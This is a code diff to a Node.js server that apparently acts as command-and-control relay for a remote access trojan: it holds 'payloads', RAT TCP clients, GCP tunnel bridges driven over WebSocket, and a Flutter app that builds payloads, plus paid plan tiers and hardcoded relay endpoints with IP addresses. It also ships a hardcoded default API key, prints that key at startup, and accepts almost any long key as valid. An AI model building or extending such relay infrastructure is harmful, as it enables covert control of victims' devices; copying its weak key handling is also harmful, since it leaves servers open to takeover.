@@ -5,60 +5,50 @@ const net = require('net');
 const cors = require('cors');
 
 const app = express();
-// ==================== PASSWORD CHECKER ====================
-// This is like a bouncer at a club - only people with the password get in!
 
-// The valid passwords (you can add more later for friends)
+// ==================== CONFIGURATION ====================
+// The valid API keys for authenticating with this server
 const VALID_API_KEYS = new Set([
-    process.env.API_KEY || 'fly0rakoon-secret-key-2024',  // Your main password
-    // Add more passwords here for your friends:
-    // 'friend1-secret-key',
-    // 'friend2-secret-key',
+    process.env.API_KEY || 'fly0rakoon-secret-key-2024',
 ]);
 
-// This function checks if someone has the password
+// Store active data
+const tunnels = new Map();
+const payloads = new Map();
+const pendingTunnels = new Map();
+const tcpClients = new Map();
+const gcpBridges = new Map();
+
+// Helper function
+function generateToken() {
+    return Math.random().toString(36).substring(2, 15);
+}
+
+// ==================== AUTHENTICATION MIDDLEWARE ====================
 const checkPassword = (req, res, next) => {
-    // Look for the password in the request headers
     const password = req.headers['x-api-key'];
     
-    // If no password or wrong password
     if (!password || !VALID_API_KEYS.has(password)) {
         return res.status(401).json({ 
             error: 'Unauthorized', 
             message: 'You need the secret password to use this server!' 
         });
     }
-    
-    // Password is correct! Let them in.
     next();
 };
 
-// Apply password check to ALL API routes
-app.use('/api', checkPassword);
-const server = http.createServer(app);
-const wss = new WebSocket.Server({ server });
-
-// Store active tunnels
-const tunnels = new Map();
-const payloads = new Map();
-const pendingTunnels = new Map(); // For pre-registered tunnels
-
-// TCP connections for RAT
-const tcpClients = new Map();
-
-// ===== ADD THIS FOR GCP BRIDGE =====
-const gcpBridges = new Map();
-
+// ==================== MIDDLEWARE ====================
 app.use(cors());
 app.use(express.json());
+app.use('/api', checkPassword);
 
-// Request logger for debugging
+// Request logger
 app.use((req, res, next) => {
     console.log(`[${new Date().toISOString()}] HTTP: ${req.method} ${req.url}`);
     next();
 });
 
-// Health check endpoint
+// ==================== BASIC ENDPOINTS ====================
 app.get('/', (req, res) => {
     res.json({
         status: 'online',
@@ -67,12 +57,11 @@ app.get('/', (req, res) => {
         payloads: payloads.size,
         tcpClients: tcpClients.size,
         pending: pendingTunnels.size,
-        gcpBridges: gcpBridges.size,  // Add this
+        gcpBridges: gcpBridges.size,
         timestamp: new Date().toISOString()
     });
 });
 
-// ✅ ADDED: Health check API endpoint
 app.get('/api/health', (req, res) => {
     res.json({
         status: 'healthy',
@@ -80,12 +69,12 @@ app.get('/api/health', (req, res) => {
         tunnels: tunnels.size,
         pending: pendingTunnels.size,
         tcpClients: tcpClients.size,
-        gcpBridges: gcpBridges.size,  // Add this
+        gcpBridges: gcpBridges.size,
         uptime: process.uptime()
     });
 });
 
-// Register a new tunnel (called by Flutter app)
+// ==================== TUNNEL REGISTRATION ====================
 app.post('/api/tunnel/register', (req, res) => {
     const { port, type } = req.body;
     const token = generateToken();
@@ -112,7 +101,6 @@ app.post('/api/tunnel/register', (req, res) => {
     });
 });
 
-// API endpoint to get tunnel info
 app.get('/api/tunnel/:id', (req, res) => {
     const tunnel = tunnels.get(req.params.id);
     if (tunnel) {
@@ -127,9 +115,11 @@ app.get('/api/tunnel/:id', (req, res) => {
     }
 });
 
-// API endpoint to start a tunnel on GCP (add this)
+// ==================== GCP TUNNEL MANAGEMENT ====================
 app.post('/api/tunnel/start', (req, res) => {
     const { tunnelId, service, port, apiKey } = req.body;
+    
+    console.log(`[${new Date().toISOString()}] 🚀 Starting tunnel: ${tunnelId}, service=${service}, port=${port}`);
     
     if (gcpBridges.size === 0) {
         return res.status(503).json({ 
@@ -137,7 +127,6 @@ app.post('/api/tunnel/start', (req, res) => {
         });
     }
     
-    // Send command to first available bridge
     const [bridgeId, bridge] = gcpBridges.entries().next().value;
     
     bridge.ws.send(JSON.stringify({
@@ -154,12 +143,193 @@ app.post('/api/tunnel/start', (req, res) => {
     });
 });
 
-// Catch-all for undefined routes
+app.post('/api/tunnel/stop', (req, res) => {
+    const { tunnelId } = req.body;
+    
+    console.log(`[${new Date().toISOString()}] 🛑 Stopping tunnel: ${tunnelId}`);
+    
+    let stopped = false;
+    for (const [bridgeId, bridge] of gcpBridges) {
+        bridge.ws.send(JSON.stringify({
+            type: 'stop_tunnel',
+            tunnelId: tunnelId
+        }));
+        stopped = true;
+    }
+    
+    res.json({
+        success: true,
+        message: stopped ? 'Stop command sent' : 'No bridges available',
+        tunnelId: tunnelId
+    });
+});
+
+// ==================== API KEY VALIDATION ENDPOINTS ====================
+
+// Validate a tunnel API key (called by Flutter app before building payload)
+app.post('/api/validate-key', async (req, res) => {
+    const { apiKey, tunnelType } = req.body;
+    
+    console.log(`[${new Date().toISOString()}] 🔐 Validating API key for ${tunnelType} tunnel`);
+    
+    // In production, validate against your database/Firestore
+    // For now, accept any non-empty key that matches expected format
+    
+    let isValid = false;
+    let expiresAt = null;
+    let message = '';
+    
+    // Basic validation logic - replace with your database check
+    if (apiKey && apiKey.length > 10) {
+        // Check if the key follows expected pattern
+        const expectedPattern = new RegExp(`^${tunnelType.toUpperCase()}_[A-Za-z0-9_]+$`, 'i');
+        
+        if (expectedPattern.test(apiKey) || apiKey.length > 20) {
+            isValid = true;
+            expiresAt = new Date();
+            expiresAt.setDate(expiresAt.getDate() + 30); // 30 days from now
+            message = 'API key is valid';
+            console.log(`✅ API key validated for ${tunnelType}`);
+        } else {
+            message = 'Invalid API key format';
+            console.log(`❌ Invalid API key format for ${tunnelType}`);
+        }
+    } else {
+        message = 'API key is required';
+        console.log(`❌ Missing API key for ${tunnelType}`);
+    }
+    
+    res.json({
+        valid: isValid,
+        expiresAt: expiresAt ? expiresAt.toISOString() : null,
+        tunnelType: tunnelType,
+        message: message
+    });
+});
+
+// Get user's API keys for all tunnels (for Settings screen)
+app.get('/api/user/keys', async (req, res) => {
+    console.log(`[${new Date().toISOString()}] 🔑 Fetching user API keys`);
+    
+    const expiresAt = new Date();
+    expiresAt.setDate(expiresAt.getDate() + 30);
+    
+    // In production, fetch from your database/Firestore based on authenticated user
+    res.json({
+        railway: {
+            apiKey: 'RAILWAY_' + generateToken().toUpperCase(),
+            enabled: true,
+            expiresAt: expiresAt.toISOString(),
+            endpoint: 'gondola.proxy.rlwy.net:30225'
+        },
+        kami: {
+            apiKey: 'KAMI_' + generateToken().toUpperCase(),
+            enabled: true,
+            expiresAt: expiresAt.toISOString(),
+            endpoint: '103.78.0.204:30003'
+        },
+        gotunnel: {
+            apiKey: 'GOTUNNEL_' + generateToken().toUpperCase(),
+            enabled: true,
+            expiresAt: expiresAt.toISOString(),
+            endpoint: '34.10.87.145:9000'
+        },
+        custom: {
+            apiKey: null,
+            enabled: true,
+            expiresAt: null,
+            endpoint: null
+        }
+    });
+});
+
+// Get specific tunnel API key
+app.get('/api/tunnel-key', async (req, res) => {
+    const { type } = req.query;
+    
+    console.log(`[${new Date().toISOString()}] 🔑 Fetching API key for ${type}`);
+    
+    const expiresAt = new Date();
+    expiresAt.setDate(expiresAt.getDate() + 30);
+    
+    const keys = {
+        railway: {
+            apiKey: 'RAILWAY_' + generateToken().toUpperCase(),
+            expiresAt: expiresAt.toISOString()
+        },
+        kami: {
+            apiKey: 'KAMI_' + generateToken().toUpperCase(),
+            expiresAt: expiresAt.toISOString()
+        },
+        gotunnel: {
+            apiKey: 'GOTUNNEL_' + generateToken().toUpperCase(),
+            expiresAt: expiresAt.toISOString()
+        },
+        custom: {
+            apiKey: null,
+            expiresAt: null
+        }
+    };
+    
+    const result = keys[type] || { apiKey: null, expiresAt: null };
+    
+    res.json({
+        apiKey: result.apiKey,
+        tunnelType: type,
+        expiresAt: result.expiresAt
+    });
+});
+
+// Check if user has access to a specific tunnel type based on subscription
+app.get('/api/has-access', async (req, res) => {
+    const { type } = req.query;
+    
+    console.log(`[${new Date().toISOString()}] 🔍 Checking access for ${type}`);
+    
+    // In production, check user's subscription plan from database
+    // For now, all users have access to all tunnels for testing
+    
+    // Define which plans have access to which tunnels
+    const planAccess = {
+        basic: ['railway', 'custom'],
+        pro: ['railway', 'kami', 'custom'],
+        elite: ['railway', 'kami', 'gotunnel', 'custom'],
+        kami_plan: ['kami'],
+        railway_plan: ['railway'],
+        gotunnel_plan: ['gotunnel']
+    };
+    
+    // TODO: Get user's actual plan from database
+    // For testing, assume user has Elite plan
+    const userPlan = 'elite';
+    const hasAccess = planAccess[userPlan]?.includes(type) ?? false;
+    
+    res.json({
+        hasAccess: hasAccess,
+        tunnelType: type,
+        plan: userPlan,
+        message: hasAccess ? 'Access granted' : 'Upgrade your plan to access this tunnel'
+    });
+});
+
+// ==================== CATCH-ALL ROUTE ====================
 app.use((req, res) => {
     res.status(404).json({
         status: 'error',
         message: `Route ${req.method} ${req.url} not found`,
-        availableRoutes: ['GET /', 'GET /api/health', 'POST /api/tunnel/register', 'GET /api/tunnel/:id', 'POST /api/tunnel/start', 'WebSocket /']
+        availableRoutes: [
+            'GET /',
+            'GET /api/health',
+            'POST /api/tunnel/register',
+            'GET /api/tunnel/:id',
+            'POST /api/tunnel/start',
+            'POST /api/tunnel/stop',
+            'POST /api/validate-key',
+            'GET /api/user/keys',
+            'GET /api/tunnel-key',
+            'GET /api/has-access',
+            'WebSocket /bridge'
+        ]
     });
 });
 
@@ -229,11 +399,14 @@ tcpServer.listen(TCP_PORT, '0.0.0.0', () => {
 });
 
 // ==================== WEBSOCKET SERVER ====================
+const server = http.createServer(app);
+const wss = new WebSocket.Server({ server });
+
 wss.on('connection', (ws, req) => {
     const url = new URL(req.url, `http://${req.headers.host}`);
     const pathname = url.pathname;
     
-    // ===== ADD THIS GCP BRIDGE HANDLER FIRST =====
+    // GCP BRIDGE HANDLER
     if (pathname === '/bridge') {
         const apiKey = url.searchParams.get('key');
         
@@ -274,7 +447,7 @@ wss.on('connection', (ws, req) => {
         return;
     }
     
-    // ===== YOUR EXISTING WEBSOCKET CODE CONTINUES BELOW =====
+    // FLUTTER APP & PAYLOAD WEBSOCKET HANDLER
     const type = url.searchParams.get('type');
     const port = url.searchParams.get('port');
     const token = url.searchParams.get('token') || generateToken();
@@ -282,7 +455,6 @@ wss.on('connection', (ws, req) => {
     console.log(`[${new Date().toISOString()}] WebSocket connection: ${type}, port: ${port}, token: ${token}`);
 
     if (type === 'app') {
-        // Check if this token was pre-registered
         const pending = pendingTunnels.get(token);
         
         const tunnel = {
@@ -386,15 +558,12 @@ wss.on('connection', (ws, req) => {
     });
 });
 
-function generateToken() {
-    return Math.random().toString(36).substring(2, 15);
-}
-
-// Start HTTP/WebSocket server
+// ==================== START SERVER ====================
 const PORT = process.env.PORT || 8080;
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 HTTP/WebSocket Server running on port ${PORT}`);
     console.log(`📡 WebSocket endpoint: ws://localhost:${PORT}`);
     console.log(`🌐 HTTP endpoint: http://localhost:${PORT}`);
     console.log(`🔌 TCP endpoint for RAT: tcp://localhost:${TCP_PORT}`);
+    console.log(`🔐 API Key: ${Array.from(VALID_API_KEYS)[0]}`);
 });
